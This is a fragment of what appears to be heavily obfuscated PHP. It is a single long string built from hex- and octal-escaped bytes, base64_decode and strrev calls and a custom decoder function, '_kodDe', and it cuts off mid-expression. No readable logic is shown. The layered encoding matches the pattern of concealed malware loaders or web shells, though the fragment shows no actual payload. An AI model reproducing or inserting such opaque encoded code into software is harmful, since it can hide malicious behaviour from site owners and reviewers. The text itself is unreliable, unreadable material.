\\U9)=')."\x7e\x27\x5e\xd0\xc1\xe6\x2c\x3e\xc9\xaa\x9a\x98\x57\x1\xaa\x4\xc4\x17\x86\x92\x43\x2c\x51\x40\xa0\x9\x53\x6a\x9e\x43\xd7\xce\x5f\x47\xe1\x60\xc\x95\x14\xcf\x31\xe8\x8c\xcc\x1b\x6a\x15\xf2\x9\x20\xfb\xb7\x80\xe8\x2\xf8\x73\x9a"."\341\171\234\253\141\313\130\126\70\357\11\175\24\162\161\316\135\341\274\210\311\161\302\7\324\124\216\115\41\260\240\263\115\261\125\152\136\73\27\377\256\243\3\231\122\350\262\14\317\263\164\102\235\205\234\72\112\267".base64_decode('+jlllAQ0k9J3TDHHFUoeAG6JA+Kg2zaQJMQySEgjX+DbJQXtHUgr8lEodo2zWELJkXHah2AbcTmvhA==')."\x84\x16\x46\xa3\x61\x4f\x5b\xb7\x2f\x4a\x39\xc\xe1\xc4\x34\x8e\xb8\x62\x1b\x3b\x1c\x3\x4d\xe3\x1c\x95\xf2\x87\x38\x17\x99\x8d\xd1\x8c\x84\x98\x81\xa4\xe8\xba\xa6\x37\xa2\x83\x3f\xa3\x90\x87\xb2\x18\xd8\x35\x99\xa0\x3f\x25\xb0\x95".base64_decode('lppbJNzNhEtExU7Py1SagLtbJiG4KyKRwqCSGBoEhCw7k0Nr69ZVUinZHQH/0QjmX6TGeT5+BpC14g==')."\46\133\160\213\316\247\242\214\3\302\52\260\143\6\115\147\353\54\204\163\251\325\324\114\71\303\320\140\132\30\102\50\267\241\153\65\331\243\343\1\354\346\114\10\256\316\302\351\35\342\220\275\354\150\212\235\70\10"."\x7\x47\x0\xe6\x10\xa2\xf8\xdf\xe6\x32\xca\xa6\x73\x60\x22\xb4\xf3\x45\xca\xef\x75\x92\x41\xf4\xac\x74\xfa\x89\x0\xcf\x2\x2a\x15\x35\x65\x30\x9d\x4d\xa\x35\xb4\x82\x1e\x57\x18\x8e\x45\xc8\x30\x65\x1d\xac\x59\x5c\xb2\x83\x32\x98"."\160\274\10\152\356\200\347\20\16\270\246\72\200\264\347\200\347\75\16\56\261\72\370\21\202\203\311\237\16\42\226\72\170\351\44\350\367\72\124\303\213\304\143\124\56\112\242\165\66\323\160\103\236\221\47\35\270\376".base64_decode('3cqYknHQ2jtooxy0BQ603/CS2vQD+iC1QUHAJNIOOBxwbGkpMEi7gQnVDi5wO1K6Vsj30S8JMVwZAg==')."\340\65\145\200\240\246\231\16\272\1\142\201\36\306\201\140\165\170\150\5\37\160\136\173\266\174\222\46\340\270\275\16\30\12\323\73\344\61\161\200\113\16\166\316\112\30\374\224\224\237\346\161\161\311\276\21\261\37"."\xf\xf1\x4e\xe4\x95\x8\xcb\xa9\x90\xf0\x79\x53\x4e\xd1\x6f\x97\x48\xc5\xe1\xa0\x12\x9f\x8c\xf3\xcd\x8d\x57\xd8\x2d\x59\x63\x6c\xe8\x11\x1d\x96\x22\xa6\xd2\x43\xcf\x8\x84\xd1\xda\xac\x7d\xf6\xa1\x94\xcd\xe9\x88\x90\x8f\x85\xd8\x66"._kodDe('KGSanNSUNi6lF4b2egoVMpz7+30uhh9IC9gsjEqdDwrtewDr/6Odiq2ZAVxyHMimQH32qbbe1+8uAQY=').base64_decode('UfKjalHcr9Es21mwjrYxI9jvfWpuUs2Je3cO5TyPEwUkbx7DfTxTGPMWfjbgIGcGDrBvHBG4Ht/jgg==')."\332\303\254\102\335\111\111\266\232\323\11\350\264\106\371\174\354\7\333\244\250\215\124\11\221\246\145\235\367\62\235\143\220\260\131\253\14\210\302\243\2\132\122\36\343\354\336\222\107\230\31\206\71\311\216\71\204\240"."\265\120\34\365\316\24\351\142\273\277\122\121\161\322\251\106\67\350\315\122\141\324\322\260\126\62\12\317\30\150\130\103\24\117\357\50\240\270\40\1\101\201\236\237\121\271\77\152\73\177\0\121\141\10\243\226\243\12"."\134\77\17\343\211\100\342\311\200\241\321\135\160\366\164\102\216\47\56\117\174\351\202\134\26\207\5\244\274\235\71\132\230\170\251\25\321\316\306\155\120\133\224\177\324\302\220\212\226\55\42\265\20\41\265\232\114\207"."\4\330\116\272\164\314\362\134\100\56\41\227\100\216\152\141\335\343\363\172\255\61\151\230\112\226\260\310\165\266\336\61\301\276\47\46\353\56\35\324\210\127\224\257\25\104\52\51\60\300\220\35\3\27\337\255\121\41".base64_decode('GU4MX0I1IQSyOY2eZnFEgf8zmFAg6hJX0Rhk1BGSyzHXglmKxbuqEDN28UVJXNLE6yaIxlsOr69wSA==').base64_decode('uKjNsvssBHQZppbnKUIUJwtJvFABi3U+qiFYGhJIcOBdiHBJXiRaY+J2ZQCGS+RRHl2nRIKbB492AA==')."\120\4\301\171\34\242\107\213\245\130\65\56\334\67\306\57\140\161\121\360\303\56\274\162\271\344\104\42\100\317\335\304\160\61\252\170\314\120\272\40\164\47\316\212\22\142\245\321\75\231\14\277\140\263\307\147\314\202"."\xe7\xaa\x98\x49\x84\xcc\x98\xad\x3\x49\xc7\xf4\xe4\xbb\x14\x8c\x9\x7b\x1d\x36\x1a\xe2\x33\x8e\x5f\x60\xda\x65\x61\x2b\xf3\xf9\x36\x39\xad\x68\x6\xf0\x1\x2d\x1d\x87\xfc\x31\xad\xe6\x14\x83\x2d\x59\xba\x51\x8a\xcf\x7c\x9b\xe0\x63".strrev('-eʈ y=h#p'."\0".''."\n".'NL3HVW7u(')."\254\77\0\346\127\151\242\263\343\51\364\120\11\61\265\11\266\127\23\63\1\42\201\253\320\114\145\322\144\126\24\137\262\156\303\77\17\375\366\123\34\230\277\150\1\16\324\343\37\360\357\156\323\273\342\60\127\101".strrev('moyvQK|F?~ļm^Lm6eװ~GkZ')."\276\372\363\345\17\326\256\371\351\374\314\303\173\146\176\367\354\225\277\333\160\110\366\346\257\223\247\277\374\165\254\363\225\173\146\157\373\323\320\201\307\217\177\364\341\53\317\75\271\366\137\275\23\7\114\75\364\300".strrev('v(\\y(gu~{eermA잙_^yo}')."\xe8\xf2\x37\xce\x5a\x74\xfa\xe7\x87\xad\x7f\x5d\xda\xe7\xf3\x85\xff\x38\xfb\xe6\x7b\x6a\xcf\x5b\xf6\xc5\xd7\xf\x3e\xb0\x61\x9f\x3\x66\x1f\x34\x79\xe9\xa5\xf\x2d\xfc\xcb\x7\x73\xaa\x17\x65\x7f\x79\xe6\x75\xe1\xe9\xa6\x43\xfe\xb2"."\x62\xe3\xc8\x85\x7f\x9d\xeb\x39\xe5\x92\xd\xbe\x44\xe8\xe6\xa7\xe6\xf8\x97\x78\x1e\x3c\xfe\xec\xae\xb7\x97\x87\x7\x1e\x6d\xfd\xd9\x3f\xca\xde\x3f\xe8\xe4\xab\xd6\xff\x6c\xc3\x55\xb\x6b\x9e\x3f\xf8\xf4\x8e\x3\x56\xbf\x7b\xf3\x8e"."\xb\xef\xec\xfa\x78\xb4\xfe\x91\x45\xb3\xcf\xee\xfa\x69\xe4\xbe\xfd\x37\x78\x76\xbc\x7d\x67\xdd\x61\xef\xfc\xfe\x38\x57\xf9\x4b\xfa\x6e\xdf\x75\x2f\xbd\xfc\xa0\x57\xce\xd6\xaf\x72\xcc\x3f\xb1\xed\xc0\xe3\xe6\xcd\x6e\x7a\x76\x9d\xb7"."\xa7\xf3\x97\xb7\xbf\x32\x75\x59\x26\x9d\x7e\xf3\xc6\xbb\x46\xbf\x2e\xbf\xe3\x1f\xff\x7a\xf6\x98\xbd\xa6\x93\xd7\x1c\x14\x9b\x3f\x7c\x6e\xc7\xaf\x57\x6f\x3f\xf8\xd\x77\xf2\xe4\xe5\x9e\xeb\x93\xd7\x5f\x1c\x93\x5f\xdc\x6f\xc9\x5d\x5f"."\376\374\242\357\157\230\235\317\316\73\334\374\317\136\323\367\76\375\236\326\260\166\352\254\133\337\170\361\205\332\313\256\377\315\165\327\51\373\35\335\160\333\41\47\251\3\317\34\272\171\227\351\107\16\350\71\370\306"."\xf0\x5f\xa7\x7e\x9c\xd8\xeb\xab\xe7\xff\x7c\xea\xd2\xf6\x1b\x6\x8e\xd6\x87\xef\xf9\xee\x4f\xd4\xeb\x87\x1a\x46\xa4\x3d\x3\x2f\xd5\xd6\x66\x37\x45\x36\xe5\x97\xbe\xf5\xd4\xfa\xd3\x6e\xbe\xee\x7c\x65\x7d\x28\xb8\xcb\xb9\xbd\x43\x4d"."\356\263\252\37\366\335\173\354\271\73\37\130\170\113\377\225\253\156\133\375\353\233\136\235\275\357\31\17\76\124\77\272\357\23\377\174\151\367\376\372\333\162\13\252\135\145\167\75\324\332\274\340\352\27\67\227\307\337".base64_decode('P2ufUHQkU7X3F39r+cefD+w87N25mcbE91cGyo477xl9k3zDmudajttrd/POUyv/+Z8L3n2tat9dTg==')."\277\345\252\335\336\172\363\215\173\117\213\77\172\356\56\361\33\266\255\61\376\166\166\272\356\315\107\133\116\375\321\225\75\257\35\160\305\302\113\317\171\364\320\71\77\313\174\62\172\346\307\147\175\120\373\132\301\363"."\356\305\36\207\67\376\322\354\332\320\36\47\371\57\16\36\330\122\365\327\123\67\337\125\233\335\307\375\367\167\134\237\335\337\270\141\315\366\205\55\217\264\350\133\237\252\75\170\125\142\147\256\132\277\351\246\334\237"."\x82\x15\x87\xed\xdf\x66\x1c\xa7\x1e\x3f\xda\xba\x71\xd1\x3b\x97\xed\x7d\xc6\xa3\x2d\xb9\xa9\x1b\xbf\x77\x5a\x59\xa4\x69\x61\xdb\x9b\xa7\x3a\x6e\xbc\xfa\x89\xcd\x23\xab\xde\x48\x1f\xbd\xe3\xf7\x8e\xf7\x5f\x7c\xe8\x16\xef\x2e\xc7\xfc".strrev('p|9'."\r".'ܞI>]B~Zײj{u').base64_decode('g9C7e755xEMvd5x0x677dY1+7z/nzq5uv/yiF+rLQodF5u5x9nm+jtcu3HTbrMb9k/+5bP+Hb/j0/Q==')."\xdf\xd\xfd\xb2\xf1\x8c\x59\xb7\x3d\xe5\x4a\x9c\xec\xfa\x64\xba\x30\x72\xe8\x96\xf6\x13\x4e\x8c\x99\x85\x96\xb9\x87\x38\x12\xea\xea\x9b\x8e\x89\xee\xb2\xde\x7c\x62\xe9\xbb\xd\x17\xfd\xf8\x22\x57\x78\xd1\xab\xc7\x7e\xf1\xe2\xf0\xf7".base64_decode('7nF+edOivznv/nR/ff3TvaMH11Ve8trGJ/c7+M3Hrz99t1DyJwc9PlbY7aIbD/vDEX+OXP7RFc9Png==').base64_decode('dOax++t77HHeE65dDml5Z/+W/FueXzQe2f948I+3O846b27NvpnP3lh38buP5jaf9d6bPzi298e+aw==')."\x2e\xbb\xeb\x27\xd7\x5c\xb0\xd7\xd2\x3b\xfe\x75\xcf\x5e\x53\xb7\x3c\xf7\xde\xab\xcf\xdc\xb3\xae\xf7\x9e\x17\x5f\xf8\xcb\x5e\x5f\x7e\x75\xed\x6b\x9f\xde\xf8\xd6\x54\x57\xc5\x45\x7f\x99\xda\xfc\xd1\xae\x7\x19\xb5\xa7\xbc\x3b\x7c\x95".base64_decode('HH/m0QXV8Z1z7rg7L6c2LZFuaT1rbbC/s+yUv7Qcv3Tk+D/Me/bjL9tzFV530ymO25aPVPzojcUnvQ==')."\160\163\254\376\307\175\373\376\146\377\325\73\133\366\131\172\344\76\277\274\161\277\321\164\345\326\57\217\373\321\65\67\77\361\335\374\35\57\235\171\324\325\317\35\166\353\133\37\376\362\274\225\327\207\22\107\215\127"."\167\257\335\264\151\133\303\15\337\373\144\164\365\105\133\126\375\263\306\67\376\161\255\317\370\342\247\203\177\17\376\347\57\372\307\57\57\373\340\275\307\227\276\371\310\231\103\107\317\132\270\345\374\253\17\70\317\365"."\xe9\x13\x2f\xdd\x15\x5c\x70\xe8\xb5\x47\x79\x8e\xbd\xea\x4f\xd5\x27\xfc\xe9\xb3\xfa\xe0\xce\x7\xf6\x3b\xcc\x37\x67\x6a\x8f\xe7\xcb\x37\x57\x1c\x28\x9f\x3f\xf8\xe0\x91\xcd\xae\x83\xfa\x82\xae\xeb\xf4\x6d\xc7\xb7\x6f\x78\xf2\xa3\x7f".base64_decode('vPhvf6p64yU9x2cP2+e1D07vOOHfl93y8o/NPS875rhjl7z08svHvX7itpNe+Vv2Z4eZU7u0XPDlzw==')."\344\237\176\330\162\341\366\317\247\366\170\341\243\173\127\54\357\71\143\316\145\377\374\367\203\13\76\134\171\155\266\347\142\365\366\225\233\246\376\374\165\307\247\333\376\324\67\357\332\315\253\12\257\375\276\347\215\375"."\336\132\135\265\143\376\175\321\265\327\135\166\333\304\324\105\37\15\336\262\277\357\216\357\66\36\166\340\362\115\233\146\35\24\276\356\157\133\356\273\177\307\107\367\46\127\377\340\266\325\367\334\165\373\127\377\376\333"."\x7b\x67\x56\x85\xc6\x96\xad\x18\xfe\xac\x67\xf0\xe6\x4f\xcf\x3e\xe6\xd7\xf3\xdf\x5c\xdd\xf5\xd3\xef\xee\x90\xf5\x78\xf3\xbc\x2f\x24\x6f\x6e\xfa\x93\xc7\xca\xdd\x5f\x7d\x7c\xcb\x63\xa9\x5f\xdc\x35\xfd\xd5\xe7\x6f\x4\xce\xb8\x6f\xdd"."\277\377\260\355\323\35\332\120\313\327\177\377\342\351\373\176\165\337\327\177\70\345\311\257\246\77\171\347\226\123\136\375\362\213\77\266\354\375\341\156\256\177\155\75\374\307\117\155\72\174\267\221\213\237\331\334\364\376"."\xbc\x96\xd7\xaf\x7c\xe5\xfe\x27\x66\xd5\x5e\xee\xdd\xb8\x6b\xf7\xaa\x96\xee\xc5\x95\xd3\x9f\xef\xd9\x74\xfb\x83\x1b\x2e\x4f\x9f\xb6\x74\xe7\xd2\x45\x35\x4f\xdf\x3e\x2b\xf3\xdd\xb7\x2b\x8f\x3d\xfa\x9a\x97\x37\xfe\xe8\xa4\x11\xc7\x49"."\153\316\152\374\323\176\372\206\37\336\234\272\46\173\207\122\371\334\206\47\77\76\163\121\317\310\353\253\217\274\351\222\337\177\160\362\207\67\56\36\355\172\353\322\327\317\275\364\7\53\76\215\315\72\276\377\375\343"."\xfc\x47\x9d\xf5\xe8\x97\x13\xd3\x8e\x5c\xc7\xaa\x8e\x4f\x3f\x5c\xbf\xd5\x5b\x1d\x59\xf7\xd1\xca\x7f\xbe\x7f\xff\x23\x17\x8d\xbc\xf7\xfd\xe7\x5e\xbd\xf3\xba\x91\x35\x67\xc\x5d\x77\xfd\xf7\x9f\x7b\x56\x7b\xe5\x85\x17\x7f\x76\x7b\xc3"."\213\27\136\274\371\357\47\177\271\162\334\373\323\65\57\274\362\310\302\203\27\235\167\305\355\346\147\17\270\37\333\164\306\254\255\273\317\375\367\301\356\125\173\37\170\326\212\367\63\247\77\174\157\357\362\266\173\357".base64_decode('PHfnfmUH1c6ZdfzqB7ZMjuz2s9df/tPJ8VteuTVx02tzLl9yzLITDvZdduid0n0nfH7SjT9w3jxv5w==').base64_decode('L3Y7s7pS7tr9oNcrLp599i2f3Kzd9JvKnQnfwReveP/aly87fyz30mfGdmX9lztbhw+bc93Fx576Rg==')."\335\311\347\24\326\14\154\232\267\375\67\37\74\331\173\344\123\127\334\270\357\332\223\152\26\374\172\355\343\117\174\231\215\7\136\374\335\51\267\334\363\340\133\327\26\156\275\66\363\331\277\236\170\267\377\325\363\33"."\72\266\376\374\275\364\340\111\267\157\215\257\177\145\353\300\53\37\247\76\175\70\163\323\323\77\176\107\116\335\363\301\353\247\275\160\365\201\357\177\360\354\330\236\363\177\172\330\350\242\370\37\173\57\154\170\346\257"."\xd7\xf7\x4d\x1f\xba\x65\xd3\xab\x91\xa7\xff\xf6\xe2\x81\xe7\xfd\x68\xe7\xd4\x54\xe1\x8d\x3d\x9e\xe9\x99\x7f\xd0\x11\x63\x15\xeb\xd7\xdc\x7c\xc3\xe3\x7\x3c\x3e\xfb\xa0\x5f\xfe\xfe\xe4\xe6\xbf\x7c\xe7\x9e\xcd\x27\x3c\xfd\xc8\xc6\xba"."\x59\x15\x2b\xdf\x5b\x33\xe7\xf0\xbd\x9d\xbf\xfd\xcd\x59\x63\x46\xeb\xbd\xf7\x7f\xb8\xdf\x9e\x3f\xdc\x38\xb5\xfd\xd9\xdd\x2f\xb9\xe2\xf9\x53\x5f\xea\xab\x5e\x76\xec\x8d\x47\x6c\xdd\xb9\x3d\xb0\xe8\x3b\x73\xae\xe\x9c\xfc\x8f\xf\xcc"."\7\356\255\272\363\364\370\236\127\254\270\345\222\33\152\364\225\7\177\276\161\367\127\316\176\376\366\314\352\355\177\272\75\175\270\257\357\244\246\357\256\177\174\327\245\73\236\37\272\323\123\167\300\271\217\306\56\211"."\267\254\375\356\306\256\163\62\317\37\323\342\32\271\377\36\371\237\303\357\237\276\333\316\356\237\357\374\301\311\77\274\342\334\7\337\331\262\364\254\267\177\263\114\335\26\337\62\320\75\160\346\31\273\276\345\214\57"."\x70\xdd\xfc\xf9\xee\xbe\xe7\x93\x67\xd6\x2a\xf3\x2e\xfa\x4c\xdd\xe5\xeb\x7\x8c\x56\x2d\x30\x78\xe2\xb9\x6d\x1f\x9f\x5b\xb1\xfb\xf5\xfa\x55\xc7\x6f\xde\x98\x7a\x6a\xdd\x60\xe1\xd7\xcf\xce\x5f\xb0\xdb\x70\xe5\xda\x97\x77\xde\xb3\xf8"."\217\57\34\360\314\207\345\177\70\142\321\242\27\16\275\357\206\343\33\302\243\357\225\257\135\373\370\203\27\54\170\356\304\127\336\321\236\154\173\171\325\337\156\54\77\377\247\317\154\132\173\377\351\133\27\356\166\231".strrev('?Wx:U?sO+ynw͜t/Gn'."\r".'r')."\153\372\327\114\75\332\332\160\176\333\325\33\37\236\226\316\223\133\42\337\171\375\254\205\173\74\363\331\336\207\136\376\353\223\157\74\150\311\321\257\346\116\177\115\276\174\351\344\105\37\157\172\354\240\143\7\332\257".base64_decode('L/vncG3s5PqF8/RVxn3Bp+6u3eemcs3YefSJP37Iq01/8g/Nfen0zjcW/Cr6809O+fT7v235+l9bng==')."\154\375\342\355\67\36\54\167\377\374\353\63\264\326\235\237\177\361\207\37\252\313\106\167\176\376\316\303\255\367\371\277\136\367\351\357\117\111\375\352\250\351\57\276\332\271\345\347\153\277\172\152\257\37\106\277\376\354"."\357\321\137\175\271\343\206\47\47\317\371\316\326\365\201\317\376\261\365\341\162\355\226\147\63\277\13\376\142\325\201\343\217\235\366\342\202\243\326\167\335\162\307\163\177\254\173\375\231\73\326\357\163\351\275\177\276\160"."\160\323\130\152\155\352\216\173\306\257\271\343\27\177\156\155\72\164\337\316\337\227\217\177\264\165\355\341\77\276\172\375\7\67\277\331\173\365\245\207\237\231\77\344\341\372\105\227\270\317\113\55\135\265\51\74\162\321"."\147\33\156\37\375\317\136\257\65\234\270\370\353\45\115\172\303\252\17\316\271\157\277\77\246\252\336\133\164\262\366\110\367\313\261\221\75\237\174\266\254\122\156\170\272\376\217\207\304\66\175\377\232\356\13\346\236\171".base64_decode('7htvHlCrfDTxzzmfKefu8lj7J3XLmg6647TXZ8391+Ppylnxp7KRY77eteGF5c1XHEJ1pxuIssL46A==')."\x44\x2c\x31\x45\x84\xe5\x5\xb\x16\x11\x91\xb2\x61\x3e\xe\x8c\xea\x72\x26\x6e\x12\xd9\x78\xc2\xc8\x2b\x72\x8a\x28\xcb\x10\xc5\x8b\x9a\x85\xa4\xa0\xfc\xf0\xe4\x48\xca\xa0\x5\x35\x10\x59\x34\x3b\x3c\x9a\x1f\xa7\xf7\x58\xb\x1b\x48"."\246\144\326\34\213\245\310\241\135\301\214\115\152\131\262\205\35\315\310\171\145\222\104\262\306\104\316\214\223\42\163\111\71\121\30\41\267\41\15\165\344\202\52\221\64\344\114\201\334\314\324\54\42\232\17\271\251\104"."\74\111\17\302\210\216\153\56\75\246\46\306\311\175\331\302\5\4\163\270\60\225\62\306\310\367\152\111\353\353\32\110\236\332\206\105\264\346\4\277\176\41\351\30\322\352\105\363\111\223\12\351\334\324\150\234\154\57"."\265\361\104\166\214\236\106\325\125\223\102\46\364\102\154\164\204\100\353\153\151\7\222\206\344\362\31\145\212\126\217\226\232\233\114\46\12\51\272\337\111\344\207\315\11\322\375\261\61\65\156\216\223\355\116\55\155\116".base64_decode('LR3AxKQ5OpEh34qlh0eyGXKoqGTzydww+dD86joaqKeVzI2k6Q1ZA9lYLKwh3V2/gEAW1ZN+WFRHqg==')."\x3a\x3c\x12\x9b\xd0\x92\xb4\xcf\x17\xd4\xd3\x8e\x26\xa7\x4f\x75\x35\xd\xb4\xe1\xe4\x93\x13\x66\x9a\x1f\x42\x99\xc6\x78\x4a\x2e\xa4\x69\x2b\xc8\xe7\x92\x86\x3e\x11\x53\x86\x49\xf3\xc7\x52\xc3\x93\x19\x32\xd4\xf5\xd5\xb5\xf4\x4b\x4"."\x37\x3f\x6a\x8c\xc9\x31\xb2\x93\x32\xe3\x46\x41\xa6\x26\x0\x23\xe3\xb1\xbc\x3c\x91\xa3\x5b\xe9\x58\x6e\x78\x8a\xea\xda\xc7\x73\x93\xa0\x53\xc9\x40\x54\xcf\xa7\xbb\xc8\x58\x7e\x9c\x5e\xd6\xa7\x62\x89\x78\x41\x23\x4\x32\x95\x57\x27"."\123\11\102\203\143\223\123\43\11\231\152\361\24\142\11\246\75\70\36\33\63\107\65\102\364\15\65\244\246\13\27\221\256\310\14\307\307\264\111\102\52\243\271\311\302\30\325\77\235\34\326\323\271\104\201\342\223\101"."\x9d\xc8\x6b\x80\x70\xa9\x22\x83\x9e\x4f\x6b\xb4\x72\x93\xe3\x6a\x7a\x2a\x45\x36\x88\xb5\xb\x49\xc7\xaa\xf1\x49\x79\x34\x41\x7a\x22\x26\x8f\x4e\x98\xa\x23\x70\x52\xe4\xf8\x54\x41\x49\x25\xa9\x2\xef\x44\x2e\x3b\x39\x3e\x45\x1a\x9f"."\223\123\223\143\124\323\41\43\233\205\111\172\172\13\362\114\16\23\5\273\251\314\104\72\221\44\124\124\230\312\146\206\151\7\217\250\211\270\116\317\351\352\353\310\250\327\314\247\363\146\76\351\205\172\132\227\332\371".base64_decode('NEA6amo8ndQShJLq6RScT2l8Sk0ZwzGSvKCafGBBHaHMkbw+nB6fpNOTfnbRfFojQplmMq6AZhPiyQ==')."\x25\xd3\xa\xd5\x3a\xd0\x53\xe9\x44\x66\x84\x34\x67\x5c\x57\xd\x99\x52\x69\xd6\x4c\xc5\x73\x9\x32\x72\xa9\xec\x84\xa1\x52\x9d\x90\xd1\xb1\xac\x9a\x1a\x27\x68\x5a\x26\x3e\x9c\x9d\x20\xd4\xb7\x80\xce\x1d\x6d\x2a\x3e\x3e\xac\x66\x29"."\x89\x93\xea\xd6\xd6\x91\xf6\xc5\xc6\xe3\xd9\x61\x7a\x5e\xb8\x60\x1\x9d\x24\xb9\x71\x2d\x4d\x8f\x16\xeb\x6b\x49\x23\x56\x65\xc9\x98\xb7\xc9\xf1\x11\x7a\xf8\x6c\x98\x60\xb0\xc\x1b\x2\x55\xd9\x8f\x8b\x2a\x9d\x23\x8a\x42\xf5\x12\xa9".strrev('%,k#k.V\\eՏvtX,!LHh@#^xcH'."\n".'6Y#')."\235\101\351\71\212\75\45\151\207\307\120\167\61\145\4\370\37\151\14\66\364\60\224\321\202\302\364\225\61\266\213\366\121\114\350\153\174\226\156\312\306\210\113\4\73\305\124\65\7\76\235\311\270\254\6\100\320\32".strrev('*7VnVqVYbB	;*Db	Ƅf	@'."\n".'UPK+M')."\120\150\247\230\206\153\301\23\155\143\50\66\51\305\316\236\371\101\50\251\40\257\35\271\147\50\352\110\64\364\126\212\264\20\205\225\226\311\211\44\62\335\161\110\370\203\16\11\135\11\112\126\263\22\277\127\142\167"."\247\342\310\213\225\324\225\174\106\216\263\12\346\47\245\244\14\262\46\32\245\44\230\0\22\125\152\226\114\215\206\305\252\211\167\223\266\306\130\46\224\275\71\226\104\320\343\5\146\252\301\356\77\54\167\161\132\173"."\x46\x36\xc\xae\xf3\x89\xee\x6c\x79\x23\x70\x94\x5d\xb8\x84\x40\xd1\xec\xae\x59\x57\x12\x2a\x55\xb1\x53\xb2\x8\x93\xaa\xb5\xa2\xb\x15\xa6\xdb\x17\xcf\x28\xb2\x6e\xb9\xcc\x69\x6a\xcd\xa7\xf3\xd0\x58\xcf\x5c\xdc\x4a\x4c\x87\xc8\x2d"."\x55\x54\xf8\x2e\x9\x73\xfd\x69\x11\x9a\xb1\x5f\x10\xd1\x9\xe6\xf2\xb6\x9\x56\x75\x10\x4d\xc8\x81\x55\x86\x16\x43\x36\xd4\xcc\xa1\x64\xfd\xca\xc1\x70\xb0\x90\x83\xa9\x44\x51\xdd\x2d\xe4\x77\x71\xd4\x71\xa2\xbc\x97\x24\x15\x8b\xca"."\111\142\124\340\317\211\20\116\61\321\224\142\106\11\373\45\235\326\346\11\371\333\243\175\36\252\357\52\347\363\156\250\111\6\25\162\205\66\203\25\151\44\52\307\64\335\244\335\133\200\152\314\244\46\75\326\236\7"."\331\234\154\60\100\7\203\317\45\14\244\40\105\346\337\21\204\62\4\33\245\40\37\107\230\35\15\353\67\144\65\305\116\317\203\46\345\230\276\223\221\221\351\322\145\200\166\252\71\205\121\100\301\140\7\366\120\163".base64_decode('MBrPaJQXAmqJJlSS2O1vi3r9xC6uuDdgV/Kp6OnzR0OhgNCHjQIbg1r6/F4Uxri2PrwZEO9MDWNc0w==')."\111\37\102\253\73\250\170\31\222\210\325\17\40\250\366\56\117\220\51\127\66\270\252\135\65\34\27\174\60\12\165\114\233\251\225\120\50\354\11\226\260\300\304\226\231\244\317\211\65\46\311\320\25\30\220\332\3\335".strrev('L+"X#%ŘPtqba2pIi)0EYЩ!rl!=')."\221\101\107\171\244\54\122\25\251\210\124\256\161\105\214\41\62\223\327\210\43\102\26\231\76\57\151\121\43\13\261\225\251\47\24\132\116\354\2\2\101\117\173\67\255\5\230\46\44\30\150\367\343\300\216\215\67\277"."\165\367\351\73\56\332\274\355\244\323\100\101\333\57\74\166\373\57\157\177\353\316\323\336\76\156\353\266\315\247\356\370\355\351\333\67\156\331\176\352\61\244\352\157\157\271\343\255\255\367\355\330\170\355\266\315\347\157"."\x3f\xef\xae\x1d\x17\x1e\x8f\x13\xde\xb9\xee\xe6\x6d\x27\x5f\xcb\x2a\x26\xbd\x73\xce\x6f\xb7\x9f\x7e\xd5\xf6\x73\x6f\xda\x7e\xda\xe6\x6d\x77\x9f\xb3\xed\xde\x63\xb7\xdd\x79\xa7\x3\xe4\x7e\x67\xfd\x69\x3b\xb6\x6e\xde\x7e\xe2\x79\xdb"."\x7f\x7d\xf4\xf6\xdb\x4e\xd9\x7e\xf1\x69\xdb\x4e\xbe\x7c\xdb\x5\xd7\xee\x38\x7d\xcb\xb6\x2b\x8e\xdb\xb6\xe1\xb4\xb7\xb7\x9c\x7b\x84\x9d\x76\x70\x7c\x90\x8e\x2\xb9\xf8\x76\x1f\x15\x31\xaa\x2a\x70\xcf\x46\x8c\x79\xb0\x57\x2b\xc1\x6f"."\x5\xd4\xb2\x5\xbf\x54\xb9\x10\x50\x5c\x8\x9a\xc8\xf4\xb6\xfb\xec\x5a\xeb\x62\x94\x58\xaa\x56\x61\xa2\x80\x34\xcd\x64\x17\x83\x58\xba\xd2\x78\x14\x19\x32\x94\xcf\x58\x8b\x69\x32\xf4\x42\xa5\x84\xca\x78\x7d\xa1\xf6\xa0\xbf\xcd\x47"."\364\70\331\100\315\105\372\204\344\76\35\100\103\301\25\54\314\114\73\212\354\213\245\12\152\137\134\51\131\32\42\273\342\132\246\220\315\241\312\112\145\120\161\245\314\1\371\72\222\152\244\62\270\56\1\200\22\7"."\xb3\xad\x2\x9a\x29\x22\x15\xb9\xf2\x55\xe5\x8e\x6a\x47\x4d\xa5\x44\x8c\x8f\x71\xe\x62\x6c\x2c\x95\x11\x43\x63\x96\xcf\xf2\x11\x47\xcc\x12\xab\x71\x54\x57\x4a\x65\xf9\x91\x32\x52\x2f\xde\xaf\xa0\xf6\x51\x8c\x69\x48\xb2\xa3\x82\x54".base64_decode('WKwuxwU80TB1WQWcXoo7GIjlB78WA+K4i+fA4wQw7DDJ0+u1YmK7475ySc4lQAruX3GYyyulGNGULQ==')."\x91\x88\xb2\x59\x3a\xa3\xd9\xd2\x19\x15\xf3\x8\x8b\xe8\xeb\x64\xe3\x8d\x95\x5b\x25\x6c\x19\x81\xab\x25\x1b\x74\xa0\x8\x14\xd\x15\x84\xe2\xd1\xa2\xb8\x1a\x68\x6\x18\x1c\x8c\xf\x2\x2c\x65\x44\x99\xe4\x25\x1\x4e\xc4\x12\xe8\x8"."\102\70\33\304\22\151\310\40\274\14\113\125\270\235\131\43\105\271\34\261\110\356\131\305\332\100\151\231\14\201\302\315\311\241\215\207\57\334\336\205\251\74\44\220\171\42\66\327\102\250\274\73\45\13\211\144\350\336"."\x9f\xe0\xe1\xe9\x2\x19\xc2\x3e\x8\xcf\xdf\xdb\x11\x8\xf6\x60\xdb\x86\x50\x7b\x97\xaf\xc7\xe3\x22\xfc\x1b\x53\x2\xc6\x87\xd2\x8b\xd4\x2c\x95\x43\xce\x87\x41\xe5\x96\xee\x47\x1f\xa2\x5d\x16\x46\x5f\x5\xf3\x2a\x6a\x2a\x86\x89\x7b"."\41\237\42\225\41\243\57\41\343\65\31\145\151\56\307\346\234\244\110\346\375\40\20\14\107\101\7\20\366\54\160\335\162\141\241\20\325\104\13\272\76\306\166\201\130\236\347\2\222\74\217\113\127\112\202\60\307\244"."\x1c\x7\x1b\x3e\x6a\xe3\x1c\xa3\xae\x14\x40\x15\xe0\x97\xdb\x3\xbd\x1d\x7e\x6a\xec\xe1\x8d\x59\xd2\xbc\x41\x3f\x34\x34\x24\x95\x93\x68\x9\x51\x7e\xc1\xf\x22\xf9\xf1\x4\xb\x73\xb\x3d\x98\xc0\x96\x7d\x10\xe1\xab\x3e\x4c\x11\x3c"."\x3a\xc0\xcf\x84\x